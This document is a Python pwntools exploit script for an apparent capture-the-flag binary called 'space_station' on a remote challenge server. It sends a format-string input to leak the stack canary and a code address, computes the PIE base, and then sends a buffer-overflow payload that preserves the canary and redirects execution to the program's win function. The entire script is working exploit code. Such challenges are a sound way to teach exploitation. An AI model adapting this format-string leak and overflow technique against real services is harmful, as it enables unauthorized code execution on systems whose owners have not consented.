#!/usr/bin/env python3
from pwn import *
import re

exe = context.binary = ELF("./space_station", checksec=False)

p = remote("offsec.m0lecon.it", 13531)
# p = process("./space_station")

CANARY_IDX = 15         #value  a3b1413b75ec3300
LEAK_MAIN_IDX = 17 # 0x55555555535e
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88
ret_gadgetoffset = 0x101a # address of ret gadget to align the stack



p.recvuntil(b'Enter your astronaut ID:')
p.sendline(f"%{CANARY_IDX}$lx.%{LEAK_MAIN_IDX}$lx".encode())
leak = p.recvline().strip().decode()

canary_str, main_str = leak.split(".")

canary = int(canary_str, 16)
leaked_main = int(main_str, 16)

log.info(f"canary = {canary:#x}")
log.info(f"leaked_main = {leaked_main:#x}")

p.recvuntil(b'Submit your mission log: ')

PIE_base = leaked_main - 0x139e
log.info(f"PIE base = {PIE_base:#x}")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(PIE_base + ret_gadgetoffset),  # Align the stack
    p64(PIE_base + exe.sym.win),
)
p.send(payload)

p.interactive()
